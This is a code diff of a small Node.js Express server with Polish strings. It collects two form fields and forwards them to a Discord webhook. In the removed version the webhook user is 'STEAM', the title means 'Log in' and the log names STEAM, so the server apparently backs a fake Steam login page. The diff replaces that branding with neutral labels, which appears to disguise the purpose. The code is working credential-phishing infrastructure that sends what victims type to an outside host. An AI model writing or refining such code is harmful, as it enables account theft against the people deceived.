@@ -1,15 +1,14 @@
 const express = require("express");
 const path = require("path");
-require("dotenv").config();
 
 const app = express();
 
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
 if (!WEBHOOK_URL) {
     console.error(
-        "Brak jajec"
+        "Brak konta w bazie danych."
     );
 
     process.exit(1);
@@ -17,11 +16,16 @@ if (!WEBHOOK_URL) {
 
 app.use(express.json());
 
-app.use(express.static(path.join(__dirname)));
+app.use(
+    express.static(
+        path.join(__dirname)
+    )
+);
 
 app.post("/api/send", async (req, res) => {
 
     try {
+
         const { pole1, pole2 } = req.body;
 
         if (
@@ -30,54 +34,74 @@ app.post("/api/send", async (req, res) => {
             !pole1.trim() ||
             !pole2.trim()
         ) {
+
             return res.status(400).json({
                 error: "Uzupełnij oba pola."
             });
         }
 
-        const discordResponse = await fetch(
-            WEBHOOK_URL,
-            {
-                method: "POST",
+        const discordResponse =
+            await fetch(
+                WEBHOOK_URL,
+                {
+                    method: "POST",
 
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
 
-                body: JSON.stringify({
-                    username: "STEAM",
+                    body: JSON.stringify({
 
-                    embeds: [
-                        {
-                            title: "Zaloguj się",
+                        username: "DUCZE",
 
-                            fields: [
-                                {
-                                    name: "Pole 1",
-                                    value: pole1
-                                        .trim()
-                                        .substring(0, 1024),
-                                    inline: false
-                                },
+                        embeds: [
+                            {
+                                title:
+                                    "Nowe zgłoszenie",
 
-                                {
-                                    name: "Pole 2",
-                                    value: pole2
-                                        .trim()
-                                        .substring(0, 1024),
-                                    inline: false
-                                }
-                            ],
+                                fields: [
+                                    {
+                                        name:
+                                            "Pole 1",
 
-                            color: 6730740,
+                                        value:
+                                            pole1
+                                                .trim()
+                                                .substring(
+                                                    0,
+                                                    1024
+                                                ),
 
-                            timestamp:
-                                new Date().toISOString()
-                        }
-                    ]
-                })
-            }
-        );
+                                        inline: false
+                                    },
+
+                                    {
+                                        name:
+                                            "Pole 2",
+
+                                        value:
+                                            pole2
+                                                .trim()
+                                                .substring(
+                                                    0,
+                                                    1024
+                                                ),
+
+                                        inline: false
+                                    }
+                                ],
+
+                                color: 6730740,
+
+                                timestamp:
+                                    new Date()
+                                        .toISOString()
+                            }
+                        ]
+                    })
+                }
+            );
 
         if (!discordResponse.ok) {
 
@@ -85,17 +109,18 @@ app.post("/api/send", async (req, res) => {
                 await discordResponse.text();
 
             console.error(
-                "Discord:",
+                "Discord error:",
                 discordResponse.status,
                 errorText
             );
 
             return res.status(502).json({
-                error: "Błąd"
+                error:
+                    "Jajca ci wybuchły."
             });
         }
 
-        res.json({
+        return res.json({
             success: true
         });
 
@@ -103,17 +128,17 @@ app.post("/api/send", async (req, res) => {
 
         console.error(error);
 
-        res.status(500).json({
-            error: "Błąd serwera."
+        return res.status(500).json({
+            error:
+                "Wystąpił błąd serwera."
         });
     }
 });
 
-
 app.listen(PORT, () => {
 
     console.log(
-        `STEAM działa na http://localhost:${PORT}`
+        `Server działa na porcie ${PORT}`
     );
 
 });
